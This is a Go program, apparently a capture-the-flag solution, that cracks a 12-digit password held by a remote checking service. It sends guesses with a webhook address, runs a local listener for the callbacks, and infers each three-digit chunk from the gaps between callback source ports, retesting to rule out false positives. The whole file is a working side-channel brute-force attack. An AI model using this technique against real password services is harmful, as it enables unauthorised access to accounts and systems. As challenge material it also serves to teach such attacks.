package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

// JSON Response from the server. Note the funky declaration, we use it to bypass some problems with lack of capital leter in
// the responce. (We need the variable to be exported (Capitalized)).
type Message struct {
	Success bool `json:"success"`
}

// Make a POST request to the server.
// Returns parsed responce from the server. True if the password is correct, otherwise false.
func makeRequest(n [4]int, hook_addr string, remote_addr string) bool {
	// Make the request body.
	req_body := fmt.Sprintf("{\"password\": \"%03d%03d%03d%03d\", \"webhooks\": [\"%s\"]}", n[0], n[1], n[2], n[3], hook_addr)
	s := strings.NewReader(req_body)

	// Make the actual POST request.
	req, err := http.Post(remote_addr, "application/json", s)

	// Is everything alright?
	if err == nil {
		// Always close.
		defer req.Body.Close()

		// Read the response. 
		body, err := ioutil.ReadAll(req.Body)

		if err != nil {
			// Oh snap!
			fmt.Print("Failed response: ", err, "\n")
			return false
		}

		// Decode JSON.
		var win Message
		err = json.Unmarshal(body, &win)

		if err != nil {
			// Oh snap!
			fmt.Printf("Failed JSON decode: %s, body=%s\n", err, body)
			return false
		}

		if win.Success {
			// Server responded that the password is correct, wooho.
			return true
		}
	} else {
		// Oh snap!
		fmt.Printf("Failed POST: %s, POST_data=%s\n", err, req_body)
	}
	return false
}

func main() {
	// Current time, used to calculate running time.
	start := time.Now()

	// Make a channel.
	cs := make(chan string)

	// Setup webhook handler.
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		cs <- r.RemoteAddr
	})

	// Setup variables.
	var addr string
	var remote_addr string

	// Either use command line or the default ones.
	if len(os.Args) != 3 {
		addr = "127.0.0.1:12345"
		remote_addr = "http://127.0.0.1:3000"
	} else {
		addr = os.Args[1]
		remote_addr = os.Args[2]
	}

	// Oh the poor old port.
	old_port := 0

	// Initial numbers.
	var n = [4]int{0, 0, 0, 0}

	// How many times retest possible values.
	retests := 3

	// GO.
	fmt.Print("Starting up Webhook listener on ", addr, "\n")
	// Start it up in a goroutine.
	go http.ListenAndServe(addr, nil)

	fmt.Print("The password is:\n")

	//Query the PasswordChecker.
	var bingo bool
	for c := 0; c < 4; c++ {
		for i := 0; i < 999; i++ {
			n[c] = i
			bingo = makeRequest(n, addr, remote_addr)
			if bingo == true {
				// We have the correct password.
				break
			}
			// Get the response from the webhook.
			port, _ := strconv.Atoi(strings.Split(<-cs, ":")[1])
			delta := (port - old_port)

			// Okey, we have something interesting here.
			// The algorytm is quite simple. If the chunk 0 is wrong, the incoming port
			// delta will be 0+2 or larger. If delta is larger than 0+2 and never is equal to
			// 2, then we have the correct number for the chunk. We're retesting this 'retests'
			// number of times and if we get 0+2, it's a false positive. In theory 2 retests
			// should be enough, but we're using 3 just to be safe.
			// Same thing applies for chunk 1 and 2, except instead of 0+2 you have 1+2 and 2+2,
			// because that's the pattern you get from the server. Chunk 3 is an exception since
			// we can easily check if it's right in one try by just checking the JSON responce.
			// That's why we don't do retests on chunk 3.
			if delta != c+2 && c != 3 {
				j := 0
				for j = 0; j < retests; j++ {
					makeRequest(n, addr, remote_addr)
					// Get the response from the webhook.
					port, _ := strconv.Atoi(strings.Split(<-cs, ":")[1])
					delta = (port - old_port)

					old_port = port
					// Nope, false positive.
					if delta == c+2 {
						break
					}
				}
				if j == retests {
					// All retests passed, we have the correct number.
					fmt.Printf(" %03d", i)
					break
				}
			} else {
				// This is chunk 3, or delta was c+2 which means that the number is not correct.
				old_port = port
			}
		}
	}

	// Print the last chunk.
	fmt.Printf(" %03d", n[3])

	// EPeen (Running time).
	dt := time.Since(start).Minutes()
	fmt.Printf("\nTime elapsed: %.2f mins.\n", dt)

	// Bye.
	fmt.Print("Shutting down in 3s.\n")
	time.Sleep(3 * time.Second)
}
